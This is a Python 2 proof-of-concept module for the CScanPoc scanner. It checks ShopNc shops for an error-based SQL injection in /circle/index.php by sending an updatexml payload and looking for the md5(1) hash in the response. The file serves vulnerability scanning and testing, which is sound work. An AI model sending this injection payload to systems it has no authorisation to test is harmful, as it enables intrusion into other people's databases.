# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'ShopNc_0002' # 平台漏洞编号，留空
    name = 'ShopNc SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        ShopNc SQL注入漏洞。
        /circle/index.php?op=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ShopNc'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'fcce8f63-e4d9-474c-bb36-7bc0cfa88bfe'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer:http://www.wooyun.org/bugs/wooyun-2010-0125517
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/circle/index.php?op=check_circle_name&name[0]=exp&name[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--'       
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)  
            if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
